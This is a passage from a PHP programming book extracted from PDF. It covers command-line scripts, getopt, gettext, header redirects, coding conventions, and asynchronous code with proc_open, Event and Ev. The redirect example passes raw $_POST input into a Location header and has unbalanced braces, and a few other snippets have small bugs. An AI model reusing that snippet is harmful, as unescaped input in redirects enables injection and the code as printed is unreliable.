PHP
Notes for ProfessionalsPHP
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial PHP group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks

Contents
About  1  ................................................................................................................................................................................... 
$debug = 0;
if (isset($opts["d"])) {
    $debug = is_array ($opts["d"]) ? count($opts["d"]) : 1;
}
fprintf(STDOUT, "Debug is %d" . PHP_EOL , $debug);
// there is no automated way for getopt to handle unexpected options
This script can be tested like so:
./test.php --help

GoalKicker.com – PHP Notes for Professionals 337./test.php --version
./test.php -f foo -ddd
./test.php -v -d -ffoo
./test.php -v5 -f=foo
./test.php -f foo -v 5 -d
Note the last method will not work because -v 5 is not valid.
Note:  As of PHP 5.3.0, getopt  is OS independent, working also on Windows.
Section 66.2: Argument Handling
Arguments are passed to the program in a manner similar to most C-style languages. $argc  is an integer containing
the number of arguments including the program name, and $argv  is an array containing arguments to the
program. The ﬁrst element of $argv  is the name of the program.
#!/usr/bin/php
printf("You called the program %s with %d arguments \n", $argv[0], $argc - 1);
unset($argv[0]);
foreach ($argv as $i => $arg) {
    printf("Argument %d is %s\n", $i, $arg);
}
Calling the above application with php example .php foo bar  (where example.php contains the above code) will
result in the following output:
You called the program example.php with 2 arguments
Argument 1 is foo
Argument 2 is bar
Note that $argc  and $argv  are global variables, not superglobal variables. They must be imported into the local
scope using the global  keyword if they are needed in a function.
This example shows the how arguments are grouped when escapes such as "" or \ are used.
Example script
var_dump ($argc, $argv);
Command line
$ php argc .argv.php --this-is-an-option three\ words\ together or "in one quote"      but\ multiple\
spaces\ counted\ as\ one
int(6)
array(6) {
  [0]=>
  string (13) "argc.argv.php"
  [1]=>
  string (19) "--this-is-an-option"
  [2]=>
  string (20) "three words together"
  [3]=>
  string (2) "or"

GoalKicker.com – PHP Notes for Professionals 338  [4]=>
  string (12) "in one quote"
  [5]=>
  string (34) "but multiple spaces counted as one"
}
If the PHP script is run using -r:
$ php -r 'var_dump($argv);'
array(1) {
  [0]=>
  string (1) "-"
}
Or code piped into STDIN of php:
$ echo '<?php var_dump($argv);'  | php
array(1) {
  [0]=>
  string (1) "-"
}
Section 66.3: Input and Output Handling
When run from the CLI, the constants STDIN , STDOUT , and STDERR  are predeﬁned. These constants are ﬁle
handles, and can be considered equivalent to the results of running the following commands:
STDIN = fopen("php://stdin" , "r");
STDOUT = fopen("php://stdout" , "w");
STDERR = fopen("php://stderr" , "w");
The constants can be used anywhere a standard ﬁle handle would be:
#!/usr/bin/php
while ($line = fgets(STDIN)) {
    $line = strtolower (trim($line));
    switch ($line) {
        case "bad":
            fprintf(STDERR, "%s is bad"  . PHP_EOL , $line);
            break;
        case "quit":
            exit;
        default:
            fprintf(STDOUT, "%s is good"  . PHP_EOL , $line);
            break;
    }
}
The builtin stream addresses referenced earlier ( php://stdin , php://stdout , and php://stderr ) can be used in
place of ﬁlenames in most contexts:
file_put_contents ('php://stdout' , 'This is stdout content' );
file_put_contents ('php://stderr' , 'This is stderr content' );
// Open handle and write multiple times.
$stdout = fopen('php://stdout' , 'w');

GoalKicker.com – PHP Notes for Professionals 339fwrite($stdout, 'Hello world from stdout'  . PHP_EOL );
fwrite($stdout, 'Hello again' );
fclose($stdout);
As an alternative, you can also use readline()  for input, and you can also use echo  or print  or any other string
printing functions for output.
$name = readline ("Please enter your name:" );
print "Hello, {$name}.";
Section 66.4: Return Codes
The exit construct can be used to pass a return code to the executing environment.
#!/usr/bin/php
if ($argv[1] === "bad") {
    exit(1);
} else {
    exit(0);
}
By default an exit code of 0 will be returned if none is provided, i.e. exit  is the same as exit(0). As exit  is not a
function, parentheses are not required if no return code is being passed.
Return codes must be in the range of 0 to 254 (255 is reserved by PHP and should not be used). By convention,
exiting with a return code of 0 tells the calling program that the PHP script ran successfully. Use a non-zero return
code to tell the calling program that a speciﬁc error condition occurred.
Section 66.5: Restrict script execution to command line
The function php_sapi_name () and the constant PHP_SAPI  both return the type of interface ( Server API) that is
being used by PHP. They can be used to restrict the execution of a script to the command line, by checking whether
the output of the function is equal to cli.
if (php_sapi_name () === 'cli') {
    echo "Executed from command line \n";
} else {
    echo "Executed from web browser \n";
}
The drupal_is_cli () function is an example of a function that detects whether a script has been executed from
the command line:
function  drupal_is_cli () {
    return (!isset($_SERVER ['SERVER_SOFTWARE' ]) && (php_sapi_name () == 'cli' ||
(is_numeric ($_SERVER ['argc']) && $_SERVER ['argc'] > 0)));
}
Section 66.6: Behavioural dierences on the command line
When running from the CLI, PHP exhibits some diﬀerent behaviours than when run from a web server. These
diﬀerences should be kept in mind, especially in the case where the same script might be run from both
environments.

GoalKicker.com – PHP Notes for Professionals 340No directory change  When running a script from a web server, the current working directory is always that
of the script itself. The code require("./stuff.inc" ); assumes the ﬁle is in the same directory as the script.
On the command line, the current working directory is the directory you're in when you call the script. Scripts
that are going to be called from the command line should always use absolute paths. (Note the magic
constants __DIR__  and __FILE__  continue to work as expected, and return the location of the script.)
No output buﬀering  The php.ini directives output_buffering  and implicit_flush  default to false  and
true , respectively. Buﬀering is still available, but must be explicitly enabled, otherwise output will always be
displayed in real time.
No time limit  The php.ini directive max_execution_time  is set to zero, so scripts will not time out by
default.
No HTML errors  In the event you have enabled the php.ini directive html_errors , it will be ignored on the
command line.
Diﬀerent php.ini can be loaded . When you are using php from cli it can use diﬀerent php.ini than web
server do. You can know what ﬁle is using by running php --ini.
Section 66.7: Running your script
On either Linux/UNIX or Windows, a script can be passed as an argument to the PHP executable, with that script's
options and arguments following:
php ~/example.php foo bar
c:\php\php .exe c:\example .php foo bar
This passes foo and bar as arguments to example.php.
On Linux/UNIX, the preferred method of running scripts is to use a shebang  (e.g. #!/usr/bin/env php ) as the ﬁrst
line of a ﬁle, and set the executable bit on the ﬁle. Assuming the script is in your path, you can then call it directly:
example.php foo bar
Using /usr/bin/env php  makes the PHP executable to be found using the PATH. Following how PHP is installed, it
might not be located at the same place (such as /usr/bin/php or /usr/local/bin/php), unlike env which is
commonly available from /usr/bin/env.
On Windows, you could have the same result by adding the PHP's directory and your script to the PATH and editing
PATHEXT to allow .php to be detected using the PATH. Another possibility is to add a ﬁle named example.bat or
example.cmd in the same directory as your PHP script and write this line into it:
c:\php\php .exe "%~dp0example.php"  %*
Or, if you added PHP's directory into the PATH, for convenient use:
php "%~dp0example.php"  %*
Section 66.8: Edge Cases of getopt()
This example shows the behaviour of getopt  when the user input is uncommon:
getopt.php
var_dump (
    getopt("ab:c::" , ["delta", "epsilon:" , "zeta::" ])
);
Shell command line

GoalKicker.com – PHP Notes for Professionals 341$ php getopt.php -a -a -bbeta -b beta -cgamma --delta --epsilon --zeta --zeta=f  -c gamma
array(6) {
  ["a"]=>
  array(2) {
    [0]=>
    bool (false)
    [1]=>
    bool (false)
  }
  ["b"]=>
  array(2) {
    [0]=>
    string (4) "beta"
    [1]=>
    string (4) "beta"
  }
  ["c"]=>
  array(2) {
    [0]=>
    string (5) "gamma"
    [1]=>
    bool (false)
  }
  ["delta"]=>
  bool(false)
  ["epsilon" ]=>
  string (6) "--zeta"
  ["zeta"]=>
  string (1) "f"
}
From this example, it can be seen that:
Individual options (no colon) always carry a boolean value of false  if enabled.
If an option is repeated, the respective value in the output of getopt  will become an array.
Required argument options (one colon) accept one space or no space (like optional argument options) as
separator
After one argument that cannot be mapped into any options, the options behind will not be mapped either.
Section 66.9: Running built-in web server
As from version 5.4, PHP comes with built-in server. It can be used to run application without need to install other
http server like nginx or apache. Built-in server is designed only in controller environment for development and
testing purposes.
It can be run with command php -S :
To test it create index.php ﬁle containing
<?php
echo "Hello World from built-in PHP server" ;
and run command php -S localhost :8080
Now yout should be able to see content in browser. To check this, navigate to http://localhost:8080
Every access should result in log entry written to terminal

GoalKicker.com – PHP Notes for Professionals 342[Mon Aug 15 18:20:19 2016] ::1:52455 [200]: /

GoalKicker.com – PHP Notes for Professionals 343Chapter 67: Localization
Section 67.1: Localizing strings with gettext()
GNU gettext  is an extension within PHP that must be included at the php.ini:
extension=php_gettext.dll #Windows extension=gettext.so #Linux
The gettext  functions implement an NLS (Native Language Support) API which can be used to internationalize your
PHP applications.
Translating strings can be done in PHP by setting the locale, setting up your translation tables and calling gettext()
on any string you want to translate.
<?php
// Set language to French
putenv('LC_ALL=    fr_FR' );
setlocale (LC_ALL, 'fr_FR');
// Specify location of translation tables for 'myPHPApp' domain
bindtextdomain ("myPHPApp" , "./locale" );
// Select 'myPHPApp' domain
textdomain ("myPHPApp" );
myPHPApp.po
#: /Hello_world.php:56
msgid "Hello"
msgstr "Bonjour"
#: /Hello_world.php:242
msgid "How are you?"
msgstr "Comment allez-vous?"
gettext() loads a given post-complied .po ﬁle, a .mo. which maps your to-be translated strings as above.
After this small bit of setup code, translations will now be looked for in the following ﬁle:
./locale/fr_FR/LC_MESSAGES /myPHPApp .mo.
Whenever you call gettext('some string' ), if 'some string'  has been translated in the .mo ﬁle, the translation
will be returned. Otherwise, 'some string'  will be returned untranslated.
// Print the translated version of 'Welcome to My PHP Application'
echo gettext("Welcome to My PHP Application" );
// Or use the alias _() for gettext()
echo _("Have a nice day" );

GoalKicker.com – PHP Notes for Professionals 344Chapter 68: Headers Manipulation
Section 68.1: Basic Setting of a Header
Here is a basic setting of the Header to change to a new page when a button is clicked.
if(isset($_REQUEST ['action' ]))
{
    switch($_REQUEST ['action' ])
    {  //Setting the Header based on which button is clicked
        case 'getState' :
            header("Location: http://NewPageForState.com/getState.php?search="  . $_POST['search' ]);
            break;
        case 'getProject' :
            header("Location: http://NewPageForProject.com/getProject.php?search="  .
$_POST['search' ]);
            break;
}
else
{
    GetSearchTerm (!NULL);
}
//Forms to enter a State or Project and click search
function  GetSearchTerm ($success )
{
    if (is_null($success ))
    {
        echo "<h4>You must enter a state or project number</h4>" ;
    }
    echo "<center><strong>Enter the State to search for</strong></center><p></p>" ;
    //Using the $_SERVER['PHP_SELF'] keeps us on this page till the switch above determines where to
go
    echo "<form action='"  . $_SERVER ['PHP_SELF' ] . "' enctype='multipart/form-data' method='POST'>
            <input type='hidden' name='action' value='getState'>
            <center>State: <input type='text' name='search' size='10'></center><p></p>
            <center><input type='submit' name='submit' value='Search State'></center>
            </form>" ;
   
    GetSearchTermProject ($success );
}
function  GetSearchTermProject ($success )
{
    echo "<center><br><strong>Enter the Project to search for</strong></center><p></p>" ;
    echo "<form action='"  . $_SERVER ['PHP_SELF' ] . "' enctype='multipart/form-data' method='POST'>
            <input type='hidden' name='action' value='getProject'>
            <center>Project Number: <input type='text' name='search' size='10'></center><p></p>
            <center><input type='submit' name='submit' value='Search Project'></center>
            </form>" ;
}
?>

GoalKicker.com – PHP Notes for Professionals 345Chapter 69: Coding Conventions
Section 69.1: PHP Tags
You should always use <?php ?> tags or short-echo tags <?= ?>. Other variations (in particular, short tags <? ?>)
should not be used as they are commonly disabled by system administrators.
When a ﬁle is not expected to produce output (the entire ﬁle is PHP code) the closing ?> syntax should be omitted
to avoid unintentional output, which can cause problems when a client parses the document, in particular some
browsers fail to recognise the <!DOCTYPE  tag and activate Quirks Mode .
Example of a simple PHP script:
<?php
print "Hello World" ;
Example class deﬁnition ﬁle:
<?php
class Foo
{
    ...
}
Example of PHP embedded in HTML:
<ul id="nav">
    <?php foreach ($navItems  as $navItem ): ?>
        <li><a href="<?= htmlspecialchars( $navItem->url ) ?>">
            <?= htmlspecialchars ($navItem ->label) ?>
        </a></li>
   <?php endforeach ; ?>
</ul>

GoalKicker.com – PHP Notes for Professionals 346Chapter 70: Asynchronous programming
Section 70.1: Advantages of Generators
PHP 5.5 introduces Generators and the yield keyword, which allows us to write asynchronous code that looks more
like synchronous code.
The yield  expression is responsible for giving control back to the calling code and providing a point of resumption
at that place. One can send a value along the yield  instruction. The return value of this expression is either null  or
the value which was passed to Generator ::send().
function  reverse_range ($i) {
    // the mere presence of the yield keyword in this function makes this a Generator
    do {
        // $i is retained between resumptions
        print yield $i;
    } while (--$i > 0);
}
$gen = reverse_range (5);
print $gen->current();
$gen->send("injected!" ); // send also resumes the Generator
foreach ($gen as $val) { // loops over the Generator, resuming it upon each iteration
    echo $val;
}
// Output: 5injected!4321
This mechanism can be used by a coroutine implementation to wait for Awaitables yielded by the Generator (by
registering itself as a callback for resolution) and continue execution of the Generator as soon as the Awaitable is
resolved.
Section 70.2: Using Icicle event loop
Icicle  uses Awaitables and Generators to create Coroutines.
require __DIR__ . '/vendor/autoload.php' ;
use Icicle\Awaitable ;
use Icicle\Coroutine\Coroutine ;
use Icicle\Loop ;
$generator  = function  (float $time) {
    try {
        // Sets $start to the value returned by microtime() after approx. $time seconds.
        $start = yield Awaitable\resolve (microtime (true))->delay($time);
        echo "Sleep time: " , microtime (true) - $start, "\n";
        // Throws the exception from the rejected awaitable into the coroutine.
        return yield Awaitable\reject (new Exception ('Rejected awaitable' ));
    } catch (Throwable $e) { // Catches awaitable rejection reason.
        echo "Caught exception: " , $e->getMessage (), "\n";
    }
    return yield Awaitable\resolve ('Coroutine completed' );

GoalKicker.com – PHP Notes for Professionals 347};
// Coroutine sleeps for 1.2 seconds, then will resolve with a string.
$coroutine  = new Coroutine ($generator (1.2));
$coroutine ->done(function  (string $data) {
    echo $data, "\n";
});
Loop\run ();
Section 70.3: Spawning non-blocking processes with
proc_open()
PHP has no support for running code concurrently unless you install extensions such as pthread . This can be
sometimes bypassed by using proc_open () and stream_set_blocking () and reading their output asynchronously.
If we split code into smaller chunks we can run it as multiple suprocesses. Then using stream_set_blocking ()
function we can make each subprocess also non-blocking. This means we can spawn multiple subprocesses and
then check for their output in a loop (similarly to an even loop) and wait until all of them ﬁnish.
As an example we can have a small subprocess that just runs a loop and in each iteration sleeps randomly for 100 -
1000ms (note, the delay is always the same for one subprocess).
<?php
// subprocess.php
$name = $argv[1];
$delay = rand(1, 10) * 100;
printf("$name delay: ${delay} ms\n");
for ($i = 0; $i < 5; $i++) {
    usleep($delay * 1000);
    printf("$name: $i\n");
}
Then the main process will spawn subprocesses and read their output. We can split it into smaller blocks:
Spawn subprocesses with proc_open()  .
Make each subprocess non-blocking with stream_set_blocking ().
Run a loop until all subprocesses ﬁnish using proc_get_status ().
Properly close ﬁle handles with the output pipe for each subprocess using fclose() and close process
handles with proc_close ().
<?php
// non-blocking-proc_open.php
// File descriptors for each subprocess.
$descriptors  = [
    0 => ['pipe', 'r'], // stdin
    1 => ['pipe', 'w'], // stdout
];
$pipes = [];
$processes  = [];
foreach (range(1, 3) as $i) {
    // Spawn a subprocess.
    $proc = proc_open ('php subprocess.php proc'  . $i, $descriptors , $procPipes );
    $processes [$i] = $proc;
    // Make the subprocess non-blocking (only output pipe).
    stream_set_blocking ($procPipes [1], 0);

GoalKicker.com – PHP Notes for Professionals 348    $pipes[$i] = $procPipes ;
}
// Run in a loop until all subprocesses finish.
while (array_filter ($processes , function ($proc) { return proc_get_status ($proc)['running' ]; })) {
    foreach (range(1, 3) as $i) {
        usleep(10 * 1000); // 100ms
        // Read all available output (unread output is buffered).
        $str = fread($pipes[$i][1], 1024);
        if ($str) {
            printf($str);
        }
    }
}
// Close all pipes and processes.
foreach (range(1, 3) as $i) {
    fclose($pipes[$i][1]);
    proc_close ($processes [$i]);
}
The output then contains mixture from all three subprocesses as they we're read by fread()  (note, that in this case
proc1  ended much earlier than the other two):
$ php non-blocking-proc_open.php
proc1 delay: 200ms
proc2 delay: 1000ms
proc3 delay: 800ms
proc1: 0
proc1: 1
proc1: 2
proc1: 3
proc3: 0
proc1: 4
proc2: 0
proc3: 1
proc2: 1
proc3: 2
proc2: 2
proc3: 3
proc2: 3
proc3: 4
proc2: 4
Section 70.4: Reading serial port with Event and DIO
DIO streams are currently not recognized by the Event  extension. There is no clean way to obtain the ﬁle descriptor
encapsulated into the DIO resource. But there is a workaround:
open stream for the port with fopen();
make the stream non-blocking with stream_set_blocking ();
obtain numeric ﬁle descriptor from the stream with EventUtil ::getSocketFd ();
pass the numeric ﬁle descriptor to dio_fdopen () (currently undocumented) and get the DIO resource;
add an Event  with a callback for listening to the read events on the ﬁle descriptor;
in the callback drain the available data and process it according to the logic of your application.
dio.php

GoalKicker.com – PHP Notes for Professionals 349<?php
class Scanner {
  protected  $port; // port path, e.g. /dev/pts/5
  protected  $fd; // numeric file descriptor
  protected  $base; // EventBase
  protected  $dio; // dio resource
  protected  $e_open; // Event
  protected  $e_read; // Event
  public function  __construct ($port) {
    $this->port = $port;
    $this->base = new EventBase ();
  }
  public function  __destruct () {
    $this->base->exit();
    if ($this->e_open)
      $this->e_open->free();
    if ($this->e_read)
      $this->e_read->free();
    if ($this->dio)
      dio_close ($this->dio);
  }
  public function  run() {
    $stream = fopen($this->port, 'rb');
    stream_set_blocking ($stream, false);
    $this->fd = EventUtil ::getSocketFd ($stream);
    if ($this->fd < 0) {
      fprintf(STDERR, "Failed attach to port, events: %d\n", $events);
      return;
    }
    $this->e_open = new Event($this->base, $this->fd, Event::WRITE, [$this, '_onOpen' ]);
    $this->e_open->add();
    $this->base->dispatch ();
    fclose($stream);
  }
  public function  _onOpen ($fd, $events) {
    $this->e_open->del();
    $this->dio = dio_fdopen ($this->fd);
    // Call other dio functions here, e.g.
    dio_tcsetattr ($this->dio, [
      'baud' => 9600,
      'bits' => 8,
      'stop'  => 1,
      'parity'  => 0
    ]);
    $this->e_read = new Event($this->base, $this->fd, Event::READ | Event::PERSIST,
      [$this, '_onRead' ]);
    $this->e_read->add();
  }
  public function  _onRead ($fd, $events) {
    while ($data = dio_read ($this->dio, 1)) {
      var_dump ($data);

GoalKicker.com – PHP Notes for Professionals 350    }
  }
}
// Change the port argument
$scanner  = new Scanner ('/dev/pts/5' );
$scanner ->run();
Testing
Run the following command in terminal A:
$ socat -d -d pty,raw,echo=0 pty,raw,echo=0
2016/12/01 18:04:06 socat[16750] N PTY is /dev/pts/5
2016/12/01 18:04:06 socat[16750] N PTY is /dev/pts/8
2016/12/01 18:04:06 socat[16750] N starting data transfer loop with FDs [5,5] and [7,7]
The output may be diﬀerent. Use the PTYs from the ﬁrst couple of rows ( /dev/pts/5 and /dev/pts/8, in particular).
In terminal B run the above-mentioned script. You may need root privileges:
$ sudo php dio.php
In terminal C send a string to the ﬁrst PTY:
$ echo test > /dev/pts/8
Output:
string(1) "t"
string(1) "e"
string(1) "s"
string(1) "t"
string(1) "
"
Section 70.5: HTTP Client Based on Event Extension
This is a sample HTTP client class based on Event  extension.
The class allows to schedule a number of HTTP requests, then run them asynchronously.
http-client.php
<?php
class MyHttpClient {
  /// @var EventBase
  protected  $base;
  /// @var array Instances of EventHttpConnection
  protected  $connections  = [];
  public function  __construct () {
    $this->base = new EventBase ();
  }
  /**

GoalKicker.com – PHP Notes for Professionals 351   * Dispatches all pending requests (events)
   *
   * @return void
   */
  public function  run() {
    $this->base->dispatch ();
  }
  public function  __destruct () {
    // Destroy connection objects explicitly, don't wait for GC.
    // Otherwise, EventBase may be free'd earlier.
    $this->connections  = null;
  }
  /**
   * @brief Adds a pending HTTP request
   *
   * @param string $address Hostname, or IP
   * @param int $port Port number
   * @param array $headers Extra HTTP headers
   * @param int $cmd A EventHttpRequest::CMD_* constant
   * @param string $resource HTTP request resource, e.g. '/page?a=b&c=d'
   *
   * @return EventHttpRequest|false
   */
  public function  addRequest ($address , $port, array $headers ,
    $cmd = EventHttpRequest ::CMD_GET, $resource  = '/')
  {
    $conn = new EventHttpConnection ($this->base, null, $address , $port);
    $conn->setTimeout (5);
    $req = new EventHttpRequest ([$this, '_requestHandler' ], $this->base);
    foreach ($headers  as $k => $v) {
      $req->addHeader ($k, $v, EventHttpRequest ::OUTPUT_HEADER );
    }
    $req->addHeader ('Host', $address , EventHttpRequest ::OUTPUT_HEADER );
    $req->addHeader ('Connection' , 'close', EventHttpRequest ::OUTPUT_HEADER );
    if ($conn->makeRequest ($req, $cmd, $resource )) {
      $this->connections  []= $conn;
      return $req;
    }
    return false;
  }
  /**
   * @brief Handles an HTTP request
   *
   * @param EventHttpRequest $req
   * @param mixed $unused
   *
   * @return void
   */
  public function  _requestHandler ($req, $unused) {
    if (is_null($req)) {
      echo "Timed out \n";
    } else {
      $response_code  = $req->getResponseCode ();
      if ($response_code  == 0) {

GoalKicker.com – PHP Notes for Professionals 352        echo "Connection refused \n";
      } elseif ($response_code  != 200) {
        echo "Unexpected response: $response_code \n";
      } else {
        echo "Success: $response_code \n";
        $buf = $req->getInputBuffer ();
        echo "Body:\n";
        while ($s = $buf->readLine (EventBuffer ::EOL_ANY)) {
          echo $s, PHP_EOL ;
        }
      }
    }
  }
}
$address  = "my-host.local" ;
$port = 80;
$headers  = [ 'User-Agent'  => 'My-User-Agent/1.0' , ];
$client = new MyHttpClient ();
// Add pending requests
for ($i = 0; $i < 10; $i++) {
  $client->addRequest ($address , $port, $headers ,
    EventHttpRequest ::CMD_GET, '/test.php?a='  . $i);
}
// Dispatch pending requests
$client->run();
test.php
This is a sample script on the server side.
<?php
echo 'GET: ', var_export ($_GET, true), PHP_EOL ;
echo 'User-Agent: ' , $_SERVER ['HTTP_USER_AGENT' ] ?? '(none)' , PHP_EOL ;
Usage
php http -client.php
Sample Output
Success: 200
Body:
GET: array (
  'a' => '1',
)
User-Agent: My-User-Agent/1.0
Success: 200
Body:
GET: array (
  'a' => '0',
)
User-Agent: My-User-Agent/1.0
Success: 200
Body:
GET: array (

GoalKicker.com – PHP Notes for Professionals 353  'a' => '3',
)
...
(Trimmed.)
Note, the code is designed for long-term processing in the CLI SAPI .
Section 70.6: HTTP Client Based on Ev Extension
This is a sample HTTP client based on Ev extension.
Ev extension implements a simple yet powerful general purpose event loop. It doesn't provide network-speciﬁc
watchers, but its I/O watcher  can be used for asynchronous processing of sockets .
The following code shows how HTTP requests can be scheduled for parallel processing.
http-client.php
<?php
class MyHttpRequest {
  /// @var MyHttpClient
  private $http_client ;
  /// @var string
  private $address ;
  /// @var string HTTP resource such as /page?get=param
  private $resource ;
  /// @var string HTTP method such as GET, POST etc.
  private $method;
  /// @var int
  private $service_port ;
  /// @var resource Socket
  private $socket;
  /// @var double Connection timeout in seconds.
  private $timeout  = 10.;
  /// @var int Chunk size in bytes for socket_recv()
  private $chunk_size  = 20;
  /// @var EvTimer
  private $timeout_watcher ;
  /// @var EvIo
  private $write_watcher ;
  /// @var EvIo
  private $read_watcher ;
  /// @var EvTimer
  private $conn_watcher ;
  /// @var string buffer for incoming data
  private $buffer;
  /// @var array errors reported by sockets extension in non-blocking mode.
  private static $e_nonblocking  = [
    11, // EAGAIN or EWOULDBLOCK
    115, // EINPROGRESS
  ];
  /**
   * @param MyHttpClient $client
   * @param string $host Hostname, e.g. google.co.uk
   * @param string $resource HTTP resource, e.g. /page?a=b&c=d
   * @param string $method HTTP method: GET, HEAD, POST, PUT etc.
   * @throws RuntimeException
   */
  public function  __construct (MyHttpClient $client, $host, $resource , $method) {

GoalKicker.com – PHP Notes for Professionals 354    $this->http_client  = $client;
    $this->host        = $host;
    $this->resource     = $resource ;
    $this->method      = $method;
    // Get the port for the WWW service
    $this->service_port  = getservbyname ('www', 'tcp');
    // Get the IP address for the target host
    $this->address = gethostbyname ($this->host);
    // Create a TCP/IP socket
    $this->socket = socket_create (AF_INET, SOCK_STREAM , SOL_TCP );
    if (!$this->socket) {
      throw new RuntimeException ("socket_create() failed: reason: "  .
        socket_strerror (socket_last_error ()));
    }
    // Set O_NONBLOCK flag
    socket_set_nonblock ($this->socket);
    $this->conn_watcher  = $this->http_client ->getLoop()
      ->timer(0, 0., [$this, 'connect' ]);
  }
  public function  __destruct () {
    $this->close();
  }
  private function  freeWatcher (&$w) {
    if ($w) {
      $w->stop();
      $w = null;
    }
  }
  /**
   * Deallocates all resources of the request
   */
  private function  close() {
    if ($this->socket) {
      socket_close ($this->socket);
      $this->socket = null;
    }
    $this->freeWatcher ($this->timeout_watcher );
    $this->freeWatcher ($this->read_watcher );
    $this->freeWatcher ($this->write_watcher );
    $this->freeWatcher ($this->conn_watcher );
  }
  /**
   * Initializes a connection on socket
   * @return bool
   */
  public function  connect () {
    $loop = $this->http_client ->getLoop();
    $this->timeout_watcher  = $loop->timer($this->timeout, 0., [$this, '_onTimeout' ]);
    $this->write_watcher  = $loop->io($this->socket, Ev::WRITE, [$this, '_onWritable' ]);
    return socket_connect ($this->socket, $this->address, $this->service_port );

GoalKicker.com – PHP Notes for Professionals 355  }
  /**
   * Callback for timeout (EvTimer) watcher
   */
  public function  _onTimeout (EvTimer $w) {
    $w->stop();
    $this->close();
  }
  /**
   * Callback which is called when the socket becomes writable
   */
  public function  _onWritable (EvIo $w) {
    $this->timeout_watcher ->stop();
    $w->stop();
    $in = implode("\r\n", [
      "{$this->method}  {$this->resource}  HTTP/1.1" ,
      "Host: {$this->host} ",
      'Connection: Close' ,
    ]) . "\r\n\r\n";
    if (!socket_write ($this->socket, $in, strlen($in))) {
      trigger_error ("Failed writing $in to socket" , E_USER_ERROR );
      return;
    }
    $loop = $this->http_client ->getLoop();
    $this->read_watcher  = $loop->io($this->socket,
      Ev ::READ, [$this, '_onReadable' ]);
    // Continue running the loop
    $loop->run();
  }
  /**
   * Callback which is called when the socket becomes readable
   */
  public function  _onReadable (EvIo $w) {
    // recv() 20 bytes in non-blocking mode
    $ret = socket_recv ($this->socket, $out, 20, MSG_DONTWAIT );
    if ($ret) {
      // Still have data to read. Append the read chunk to the buffer.
      $this->buffer .= $out;
    } elseif ($ret === 0) {
      // All is read
      printf("\n<<<<\n%s\n>>>>", rtrim($this->buffer));
      fflush(STDOUT);
      $w->stop();
      $this->close();
      return;
    }
    // Caught EINPROGRESS, EAGAIN, or EWOULDBLOCK
    if (in_array (socket_last_error (), static::$e_nonblocking )) {
      return;
    }
    $w->stop();
    $this->close();

GoalKicker.com – PHP Notes for Professionals 356  }
}
/////////////////////////////////////
class MyHttpClient {
  /// @var array Instances of MyHttpRequest
  private $requests  = [];
  /// @var EvLoop
  private $loop;
  public function  __construct () {
    // Each HTTP client runs its own event loop
    $this->loop = new EvLoop();
  }
  public function  __destruct () {
    $this->loop->stop();
  }
  /**
   * @return EvLoop
   */
  public function  getLoop () {
    return $this->loop;
  }
  /**
   * Adds a pending request
   */
  public function  addRequest (MyHttpRequest $r) {
    $this->requests  []= $r;
  }
  /**
   * Dispatches all pending requests
   */
  public function  run() {
    $this->loop->run();
  }
}
/////////////////////////////////////
// Usage
$client = new MyHttpClient ();
foreach (range(1, 10) as $i) {
  $client->addRequest (new MyHttpRequest ($client, 'my-host.local' , '/test.php?a='  . $i, 'GET'));
}
$client->run();
Testing
Suppose http://my-host.local/test.php  script is printing the dump of $_GET :
<?php
echo 'GET: ', var_export ($_GET, true), PHP_EOL ;
Then the output of php http -client.php command will be similar to the following:
<<<<

GoalKicker.com – PHP Notes for Professionals 357HTTP/1.1 200 OK
Server: nginx/1.10.1
Date: Fri, 02 Dec 2016 12:39:54 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: PHP/7.0.13-pl0-gentoo
1d
GET: array (
 'a' => '3',
)
0
>>>>
<<<<
HTTP/1.1 200 OK
Server: nginx/1.10.1
Date: Fri, 02 Dec 2016 12:39:54 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: PHP/7.0.13-pl0-gentoo
1d
GET: array (
 'a' => '2',
)
0
>>>>
...
(trimmed)
Note, in PHP 5 the sockets  extension may log warnings for EINPROGRESS , EAGAIN , and EWOULDBLOCK  errno  values. It is
possible to turn oﬀ the logs with
error_reporting (E_ERROR);
Section 70.7: Using Amp event loop
Amp  harnesses Promises [another name for Awaitables] and Generators for coroutine creation.
